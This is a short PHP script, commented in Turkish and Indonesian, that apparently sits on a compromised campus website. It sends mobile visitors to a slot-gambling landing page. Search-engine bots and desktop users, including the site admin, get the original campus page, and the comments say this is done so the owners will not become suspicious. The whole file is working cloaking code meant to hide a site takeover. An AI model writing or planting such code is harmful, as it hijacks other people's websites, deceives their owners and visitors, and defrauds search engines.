<?php
// Kullanıcı IP'si ve User-Agent'ı kontrol et
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü

// Google ile ilgili user-agent kontrolleri
// Jika robot Google atau crawler lain yang datang
if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false || stripos($user_agent, 'crawl') !== false) {
    include('home.php');  // Berikan konten asli kampus agar aman
} 
// Jika user asli menggunakan HP/Mobile
elseif ($is_mobile) {
    include('size.php');  // Berikan Landing Page Slot Anda
} 
// Jika user dari desktop (termasuk admin web)
else {
    include('home.php');  // Tetap berikan konten asli kampus agar tidak curiga
}
?>
